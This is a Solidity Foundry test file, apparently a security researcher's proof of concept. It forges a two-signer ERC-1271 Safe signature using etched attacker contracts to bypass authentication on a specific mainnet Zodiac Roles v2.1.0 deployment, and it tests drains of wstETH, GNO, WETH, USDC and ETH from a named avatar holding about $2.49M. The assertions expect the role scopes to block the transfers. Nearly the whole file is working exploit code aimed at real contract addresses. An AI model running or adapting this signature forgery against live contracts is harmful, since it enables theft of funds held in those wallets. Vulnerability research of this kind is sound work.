// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

interface IERC20 {
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

/// @notice Forged ERC-1271 signature against the highest-value reachable
/// Zodiac Roles v2.1.0 instance (avatar 0x4971DD..., ~$2.49M).
/// The module Safe has threshold 2, so two attacker contracts are used.
contract ZodiacTopAvatarTest is Test {
    address constant ROLES = 0x2b818761ebCf1CcA5e609cC71D8feCB658ADBa20;
    address constant AVATAR = 0x4971DD016127F390a3EF6b956Ff944d0E2e1e462;
    address constant MODULE_SAFE = 0xf423f27FAe9dDd0ee0d50cbC11B94c99DcB347A9;
    bytes32 constant MANAGER = bytes32("MANAGER");

    address internal A1;
    address internal A2;
    address internal FRESH;

    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant WSTETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant GNO = 0x6810e776880C02933D47DB1b9fc05908e5386b96;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function setUp() public {
        vm.createSelectFork(vm.envOr("FORK_RPC_URL", string("https://ethereum-rpc.publicnode.com")));
        A1 = makeAddr("attacker-one");
        A2 = makeAddr("attacker-two");
        if (uint160(A1) > uint160(A2)) (A1, A2) = (A2, A1);
        FRESH = makeAddr("fresh-eoa");
        vm.etch(A1, hex"631626ba7e6000526004601cfd");
        vm.etch(A2, hex"631626ba7e6000526004601cfd");
    }

    /// @dev 2-of-2 forged Safe signature blob (two attacker contract signers).
    function _safeSig() internal view returns (bytes memory) {
        uint256 s1 = 130; // after the two 65-byte headers
        uint256 s2 = 194; // after len1+data1
        return
            abi.encodePacked(
                bytes32(uint256(uint160(A1))),
                s1,
                uint8(0),
                bytes32(uint256(uint160(A2))),
                s2,
                uint8(0),
                uint256(32),
                bytes32(uint256(0xA11CE)),
                uint256(32),
                bytes32(uint256(0xB0B))
            );
    }

    function _forge(address to, uint256 value, bytes memory inner) internal view returns (bytes memory) {
        bytes memory args = abi.encodeWithSelector(
            0xc6fe8747, // execTransactionWithRole
            to,
            value,
            inner,
            uint8(0),
            MANAGER,
            false
        );
        bytes memory sig = _safeSig();
        return
            abi.encodePacked(
                args,
                sig,
                bytes32(uint256(0x5A17)),
                bytes32(uint256(uint160(MODULE_SAFE))),
                bytes32(args.length),
                uint8(0)
            );
    }

    function _probe(address token, uint256 value, bytes memory inner) internal returns (bool ok, bytes memory ret) {
        vm.prank(FRESH);
        (ok, ret) = ROLES.call(_forge(token, value, inner));
    }

    function test_top_avatar_auth_bypass_scope_blocked() public {
        uint256 bal = IERC20(WSTETH).balanceOf(AVATAR);
        emit log_named_uint("avatar wstETH", bal);
        (bool ok, bytes memory ret) = _probe(
            WSTETH,
            0,
            abi.encodeWithSelector(IERC20.transfer.selector, A1, bal)
        );
        emit log_named_string("wstETH transfer success", ok ? "TRUE" : "false");
        emit log_named_bytes("revert data", ret);
        assertFalse(ok, "scope permitted wstETH drain");
        assertEq(bytes4(ret), bytes4(keccak256("ConditionViolation(uint8,bytes32)")));
    }

    function test_top_avatar_other_tokens_blocked() public {
        address[3] memory tokens = [GNO, WETH, USDC];
        for (uint i; i < 3; i++) {
            uint256 bal = IERC20(tokens[i]).balanceOf(AVATAR);
            (bool ok, bytes memory ret) = _probe(
                tokens[i],
                0,
                abi.encodeWithSelector(IERC20.transfer.selector, A1, bal)
            );
            emit log_named_uint("token", i);
            emit log_named_uint("balance", bal);
            emit log_named_string("success", ok ? "TRUE" : "false");
            emit log_named_bytes("revert", ret);
            assertFalse(ok, "scope permitted token drain");
        }
    }

    function test_top_avatar_approve_blocked() public {
        (bool ok, bytes memory ret) = _probe(
            WSTETH,
            0,
            abi.encodeWithSelector(IERC20.approve.selector, A1, type(uint256).max)
        );
        emit log_named_string("approve success", ok ? "TRUE" : "false");
        emit log_named_bytes("revert", ret);
        assertFalse(ok, "scope permitted approve");
    }

    function test_top_avatar_native_blocked() public {
        (bool ok, bytes memory ret) = _probe(A1, AVATAR.balance, "");
        emit log_named_string("native success", ok ? "TRUE" : "false");
        emit log_named_bytes("revert", ret);
        assertFalse(ok, "scope permitted native drain");
    }
}
